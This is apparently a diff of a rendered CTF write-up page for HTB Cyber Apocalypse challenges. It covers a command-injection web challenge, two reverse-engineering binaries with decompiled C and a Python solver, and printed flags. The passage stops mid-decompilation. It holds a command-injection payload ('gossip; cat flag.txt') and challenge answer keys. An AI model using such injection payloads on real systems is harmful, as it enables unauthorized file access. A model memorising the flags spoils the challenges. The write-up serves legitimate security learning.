+        data-sizes="auto"
+        alt="/images/htb-cyber-apocalypse_web1-04.png"
+        title="Trial by Fire-04" width="986" height="453" /></p>
+<h3 id="flag">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><code>HTB{Fl4m3_P34ks_Tr14l_Burn5_Br1ght_cce96f85ad54b396cdee745fbe91bf5b}</code></div>
+        </div>
+    </div>
+<h2 id="2-whispers-of-the-moonbeam">2. Whispers of the Moonbeam</h2>
+<h3 id="description-1">Description</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">In the heart of Valeria&rsquo;s bustling capital, the Moonbeam Tavern stands as a lively hub of whispers, wagers, and illicit dealings. Beneath the laughter of drunken patrons and the clinking of tankards, it is said that the tavern harbors more than just ale and merriment—it is a covert meeting ground for spies, thieves, and those loyal to Malakar&rsquo;s cause. The Fellowship has learned that within the hidden backrooms of the Moonbeam Tavern, a crucial piece of information is being traded—the location of the Shadow Veil Cartographer, an informant who possesses a long-lost map detailing Malakar’s stronghold defenses. If the fellowship is to stand any chance of breaching the Obsidian Citadel, they must obtain this map before it falls into enemy hands.</div>
+        </div>
+    </div>
+<h3 id="required-knowledge-1">Required Knowledge</h3>
+<ul>
+<li>Command Injection</li>
+</ul>
+<h3 id="solve-walkthrough-1">Solve Walkthrough</h3>
+<p>When open the web url, type <code>help</code> to see list what commands that can be use. One command called <code>gossip</code> is behave like <code>ls</code> command. The <code>flag.txt</code> file is located at the current directory.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/htb-cyber-apocalypse_web2-01.png"
+        data-srcset="/images/htb-cyber-apocalypse_web2-01.png, /images/htb-cyber-apocalypse_web2-01.png 1.5x, /images/htb-cyber-apocalypse_web2-01.png 2x"
+        data-sizes="auto"
+        alt="/images/htb-cyber-apocalypse_web2-01.png"
+        title="Whispers of the Moonbeam-01" width="600" height="460" /></p>
+<p>Okay, now let&rsquo;s find out how to read that <code>flag.txt</code> file. Simply, we can use <strong>semicolon as delimiter of second command</strong>, like regular command injection attack. So, the first command <code>gossip</code> is to bypass the command check and <code>; cat flag.txt</code> is to read the flag.</p>
+<p>Here&rsquo;s my POC to read the flag.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gossip<span class="p">;</span> cat flag.txt</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/htb-cyber-apocalypse_web2-02.png"
+        data-srcset="/images/htb-cyber-apocalypse_web2-02.png, /images/htb-cyber-apocalypse_web2-02.png 1.5x, /images/htb-cyber-apocalypse_web2-02.png 2x"
+        data-sizes="auto"
+        alt="/images/htb-cyber-apocalypse_web2-02.png"
+        title="Whispers of the Moonbeam-02" width="1013" height="569" /></p>
+<h3 id="flag-1">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><code>HTB{Sh4d0w_3x3cut10n_1n_Th3_M00nb34m_T4v3rn_df37873135314ddc601fbc674ec2339f}</code></div>
+        </div>
+    </div>
+<hr>
+<h1 id="reverse">Reverse</h1>
+<h2 id="1-ecryptedscroll">1. EcryptedScroll</h2>
+<h3 id="description-2">Description</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Elowen Moonsong, an Elven mage of great wisdom, has discovered an ancient scroll rumored to contain the location of The Dragon’s Heart. However, the scroll is enchanted with an old magical cipher, preventing Elowen from reading it.</div>
+        </div>
+    </div>
+<h3 id="required-knowledge-2">Required Knowledge</h3>
+<ul>
+<li>C programming</li>
+<li>Reverse binary file</li>
+</ul>
+<h3 id="solve-walkthrough-2">Solve Walkthrough</h3>
+<p><strong>1. Basic File Checks</strong></p>
+<p>First, I do basic file check using <code>file</code> command.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">challenge: ELF 64-bit LSB pie executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span class="o">[</span>sha1<span class="o">]=</span>5e966c94fbbe92e2607134ac2c0c78ee9d555b30, <span class="k">for</span> GNU/Linux 4.4.0, not stripped</span></span></code></pre></div></div>
+<p>From the output above, we can see that it is a ELF 64-bit dynamically linked binary with PIE enabled. To get more binary protection, use the <code>checksec</code> command.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Arch:       amd64-64-little
+</span></span><span class="line"><span class="cl">RELRO:      Partial RELRO
+</span></span><span class="line"><span class="cl">Stack:      Canary found
+</span></span><span class="line"><span class="cl">NX:         NX enabled
+</span></span><span class="line"><span class="cl">PIE:        PIE enabled
+</span></span><span class="line"><span class="cl">Stripped:   No</span></span></code></pre></div></div>
+<p>Mostly, all the protections is enabled and only <strong>Partial RELRO</strong>.</p>
+<p><strong>2. Analyze The Binary</strong></p>
+<p>Here&rsquo;s the decompiled code of some interesting functions.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// challenge.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined1</span> <span class="n">buffer</span> <span class="p">[</span><span class="mi">56</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">canary</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">canary</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">anti_debug</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">display_scroll</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00102220</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="o">%</span><span class="mi">49</span><span class="n">s</span><span class="p">,</span><span class="n">buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">decrypt_message</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">canary</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__stack_chk_fail</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">decrypt_message</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">is_same</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span> <span class="p">[</span><span class="mi">40</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">canary</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">canary</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">builtin_strncpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="s">&#34;IUC|t2nqm4`gm5h`5s2uin4u2d~&#34;</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="err">&#39;\\</span><span class="mi">0</span><span class="err">&#39;</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">is_same</span> <span class="o">=</span> <span class="nf">strcmp</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="n">buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">is_same</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;The Dragon</span><span class="se">\\</span><span class="s">&#39;s Heart is hidden beneath the Eternal Flame in Eldoria.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;The scroll remains unreadable... Try again.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">canary</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__stack_chk_fail</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>From the decompiled of <code>decrypt_message</code> we got interesting information, that is the string <code>IUC|t2nqm4gm5h5s2uin4u2d~</code> . The logic behind <code>decrypt_message</code> is very simple, it just <strong>decrease each character of string &ldquo;</strong><code>**IUC|t2nqm4gm5h5s2uin4u2d~**</code><strong>&rdquo; by 1 and the result will be put in buffer</strong>. Then, our input will be compared with the buffer.</p>
+<h3 id="3-decrypt-the-secret-message">3. Decrypt The Secret Message</h3>
+<p>To get the flag is simply do the logic <code>buffer[i] = buffer[i] + -1;</code> . Take a look at the image below.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/htb-cyber-apocalypse_rev1-01.png"
+        data-srcset="/images/htb-cyber-apocalypse_rev1-01.png, /images/htb-cyber-apocalypse_rev1-01.png 1.5x, /images/htb-cyber-apocalypse_rev1-01.png 2x"
+        data-sizes="auto"
+        alt="/images/htb-cyber-apocalypse_rev1-01.png"
+        title="EncryptedScroll-01" width="534" height="450" /></p>
+<p>As you can see on the image above, the pattern of flag is appears. So, we just simply do for loop to decrypt the message. Here&rsquo;s my solver script.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">solve</span><span class="p">(</span><span class="n">encrypted_message</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">len_encrypted_message</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">encrypted_message</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">len_encrypted_message</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">encrypted_message</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">res</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encrypted_message</span> <span class="o">=</span> <span class="s2">&#34;IUC|t2nqm4`gm5h`5s2uin4u2d~&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decrypted_message</span> <span class="o">=</span> <span class="n">solve</span><span class="p">(</span><span class="n">encrypted_message</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">decrypted_message</span><span class="p">)</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/htb-cyber-apocalypse_rev1-02.png"
+        data-srcset="/images/htb-cyber-apocalypse_rev1-02.png, /images/htb-cyber-apocalypse_rev1-02.png 1.5x, /images/htb-cyber-apocalypse_rev1-02.png 2x"
+        data-sizes="auto"
+        alt="/images/htb-cyber-apocalypse_rev1-02.png"
+        title="EncryptedScroll-02" width="1157" height="306" /></p>
+<h3 id="flag-2">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><code>HTB{s1mpl3_fl4g_4r1thm3t1c}</code></div>
+        </div>
+    </div>
+<h2 id="2-sealedrune">2. SealedRune</h2>
+<h3 id="description-3">Description</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Elowen has reached the Ruins of Eldrath, where she finds a sealed rune stone glowing with ancient power. The rune is inscribed with a secret incantation that must be spoken to unlock the next step in her journey to find The Dragon’s Heart.</div>
+        </div>
+    </div>
+<h3 id="required-knowledge-3">Required Knowledge</h3>
+<ul>
+<li>C programming</li>
+<li>Reverse binary file</li>
+</ul>
+<h3 id="solve-walkthrough-3">Solve Walkthrough</h3>
+<p><strong>1. Basic File Checks</strong></p>
+<p>First, I do basic file check using <code>file</code> command.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./challenge: ELF 64-bit LSB pie executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span class="o">[</span>sha1<span class="o">]=</span>47f180529af15b5a7d4601583b2944010ae6e092, <span class="k">for</span> GNU/Linux 4.4.0, not stripped</span></span></code></pre></div></div>
+<p>From the output above, this is a 64-bit dynamically linked ELF binary. Let&rsquo;s see for others binary protections.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Arch:       amd64-64-little
+</span></span><span class="line"><span class="cl">RELRO:      Partial RELRO
+</span></span><span class="line"><span class="cl">Stack:      Canary found
+</span></span><span class="line"><span class="cl">NX:         NX enabled
+</span></span><span class="line"><span class="cl">PIE:        PIE enabled
+</span></span><span class="line"><span class="cl">Stripped:   No</span></span></code></pre></div></div>
+<p>Same as rev challenge before &ldquo;<em>EncryptedScroll</em>&rdquo;, the binary mostly have all protections, except <strong>Partial RELRO</strong>.</p>
+<p><strong>2. Analyze The Binary</strong></p>
+<p>Let&rsquo;s see the decompiled code inside the binary. I&rsquo;m using Ghidra for this case.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined1</span> <span class="n">input</span> <span class="p">[</span><span class="mi">56</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">canary</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">canary</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">anti_debug</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">display_rune</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00102750</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter the incantation to reveal its secret: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="o">%</span><span class="mi">49</span><span class="n">s</span><span class="p">,</span><span class="n">input</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">check_input</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">canary</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__stack_chk_fail</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">check_input</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">secret_msg</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">lVar2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">secret_msg</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">decode_secret</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">strcmp</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="n">secret_msg</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00102050</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">lVar2</span> <span class="o">=</span> <span class="nf">decode_flag</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\</span><span class="s">x1b[1;33m%s</span><span class="se">\\</span><span class="s">x1b[0m</span><span class="se">\\</span><span class="s">n&#34;</span><span class="p">,</span><span class="n">lVar2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\</span><span class="s">x1b[1;31mThe rune rejects your words... Try again.</span><span class="se">\\</span><span class="s">x1b[0m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">free</span><span class="p">(</span><span class="n">secret_msg</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">decode_secret</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">uVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">decoded_secret</span> <span class="o">=</span> <span class="nf">base64_decode</span><span class="p">(</span><span class="n">incantation</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">reverse_str</span><span class="p">(</span><span class="n">decoded_secret</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">uVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span> <span class="nf">base64_decode</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">__nmemb</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">pvVar2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">pcVar3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_80</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_7c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_78</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span> <span class="p">[</span><span class="mi">72</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">canary</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">canary</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
